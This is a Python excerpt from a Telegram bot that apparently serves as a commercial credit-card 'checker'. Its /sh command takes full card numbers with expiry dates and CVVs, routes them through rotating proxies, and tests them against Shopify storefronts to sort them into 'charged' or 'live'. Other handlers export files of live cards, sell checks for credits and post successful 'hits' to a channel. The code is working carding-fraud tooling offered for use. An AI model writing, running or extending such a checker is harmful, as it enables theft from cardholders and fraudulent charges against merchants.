    logging.info(f"[MSH] {sid} done  C:{sess['charged']} L:{sess['approved']} "
                 f"D:{sess['dead']} E:{sess['errors']}")


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# CALLBACK HANDLERS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
async def cb_msh_result(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q     = update.callback_query
    parts = q.data.split(":", 2)
    if len(parts) < 3:
        await q.answer("❌ Invalid.", show_alert=True); return
    _, sid, kind = parts
    sess = MSH_SESSIONS.get(sid)
    if not sess:
        await q.answer("⚠️ Session expired.", show_alert=True); return
    if q.from_user.id != sess.get("user_id"):
        await q.answer("❌ Not your session.", show_alert=True); return
    locked_for = int(BUTTON_LOCK - (time.time() - sess["start_time"]))
    if locked_for > 0:
        await q.answer(f"⏳ Wait {locked_for}s", show_alert=True); return
    buf, fname, count = _make_result_file(sess, kind)
    if count == 0 and kind != "all":
        await q.answer(f"❌ No {kind.capitalize()} cards yet.", show_alert=True); return
    await q.answer("📦 Generating file…")
    labels  = {"live": "Live ✅", "all": "All 📁"}
    caption = (f"<b>Result ➳ {labels.get(kind,'All')}</b>\n"
               f"<b>Total ➳ {count}</b>\n"
               f"<b>Gate ➳ Shopify Mass</b>")
    try:
        await context.bot.send_document(
            chat_id=q.message.chat_id,
            document=InputFile(buf, filename=fname),
            caption=caption, parse_mode="HTML",
            reply_to_message_id=sess.get("user_msg_id"),
        )
    except Exception as e:
        logging.error(f"[MSH] send_document: {e}")
        try:
            buf.seek(0)
            await context.bot.send_document(
                chat_id=q.message.chat_id,
                document=InputFile(buf, filename=fname),
                caption=caption, parse_mode="HTML",
            )
        except Exception:
            pass


async def cb_msh_stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q     = update.callback_query
    parts = q.data.split(":", 1)
    if len(parts) < 2:
        await q.answer("❌ Invalid.", show_alert=True); return
    _, sid = parts
    sess = MSH_SESSIONS.get(sid)
    if not sess:
        await q.answer("⚠️ Already finished.", show_alert=True); return
    if q.from_user.id != sess.get("user_id"):
        await q.answer("❌ Not your session.", show_alert=True); return
    if sess["status"] != "CHECKING":
        await q.answer("ℹ️ Not running.", show_alert=True); return
    sess["status"] = "STOPPED"
    for t in sess.get("tasks", []):
        if not t.done(): t.cancel()
    await q.answer("🛑 Stopped.")
    sess["last_text"] = ""
    await _update_progress(context.bot, sid, force=True)


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# /sh COMMAND
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
async def cmd_sh(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    ud   = _get_ud(user.id, context)

    if context.bot_data.get("maintenance") and user.id != OWNER_ID:
        await update.message.reply_text("🔧 <b>Bot under maintenance.</b>",
                                        parse_mode="HTML"); return
    if not context.bot_data.get("sh_on", True):
        await update.message.reply_text("❌ <b>Single check disabled.</b>",
                                        parse_mode="HTML"); return

    card = None
    if context.args:
        card = context.args[0].strip()
    elif update.message.reply_to_message:
        txt = (update.message.reply_to_message.text or
               update.message.reply_to_message.caption or "").strip()
        if txt: card = txt.split()[0]

    if not card or "|" not in card:
        await update.message.reply_text(
            "ℹ️ <b>Usage:</b> <code>/sh cc|mm|yy|cvv</code>",
            parse_mode="HTML"); return

    parts = card.split("|")
    if len(parts) != 4:
        await update.message.reply_text("❌ Invalid format.", parse_mode="HTML"); return

    cc, mm, yy, cvv = parts
    if not luhn_check(cc):
        await update.message.reply_text("❌ Card failed Luhn check.", parse_mode="HTML"); return
    if is_expired(mm, yy):
        await update.message.reply_text("❌ Card is expired.", parse_mode="HTML"); return

    premium = _is_premium(ud, user.id)
    if not premium:
        if ud.get("credits", 0) <= 0:
            await update.message.reply_text(
                "❌ <b>No credits.</b> Use /buy to upgrade.", parse_mode="HTML"); return
        cd_map = context.bot_data.setdefault("sh_cd", {})
        rem    = SH_COOLDOWN - (time.time() - cd_map.get(user.id, 0))
        if rem > 0:
            await update.message.reply_text(
                f"⏳ <b>Cooldown:</b> wait <b>{int(rem)}s</b>",
                parse_mode="HTML"); return
        cd_map[user.id] = time.time()
        ud["credits"]   = max(0, ud.get("credits", 1) - 1)

    plan = ud.get("plan", "TRIAL")
    spin = await update.message.reply_text(
        f'<b>{_te(PROG_GATE_EMOJI_ID,"🛒")} Gate ➳ Shopify</b>\n'
        f'<b>{_te(PROG_PROGRESS_EMOJI_ID,"🔄")} Checking...</b>',
        parse_mode="HTML",
    )

    sites   = _load_sites()
    proxies = _load_proxies()

    if not proxies:
        await spin.edit_text(
            "❌ <b>No proxies in px.txt</b>\n\n"
            "Add proxies to <code>px.txt</code> (one ip:port per line).",
            parse_mode="HTML"); return

    t0 = time.time()
    try:
        (verdict, resp, price, currency), bin_data = await asyncio.gather(
            _check_card_with_retry(None, card, sites, proxies,
                                   max_sites=SITE_RETRIES, site_timeout=SITE_TIMEOUT),
            _bin_lookup(cc[:6]),
        )
    except Exception as e:
        verdict, resp, price, currency = "ERROR", str(e)[:60], "0.00", "USD"
        bin_data = {}

    elapsed = time.time() - t0
    text    = build_result_msg(card, resp, verdict, bin_data,
                               price, currency, elapsed, user, plan)

    if verdict in ("CHARGED", "LIVE", "TDS"):
        kb = RawMarkup([[_btn(
            "💎 CHARGED" if verdict == "CHARGED" else "✅ LIVE",
            url=BOT_CHANNEL, style="primary",
        )]])
    else:
        kb = RawMarkup([[_btn("📢 Channel", url=BOT_CHANNEL)]])

    try:
        await spin.edit_text(text, parse_mode="HTML",
                             disable_web_page_preview=True, reply_markup=kb)
    except Exception:
        await update.message.reply_text(text, parse_mode="HTML",
                                        disable_web_page_preview=True, reply_markup=kb)

    if verdict in ("CHARGED", "LIVE", "TDS"):
        asyncio.create_task(_send_hit(context.bot, user, text, verdict))


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# EXPORT
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
def get_sh_handler() -> CommandHandler:
    return CommandHandler("sh", cmd_sh)
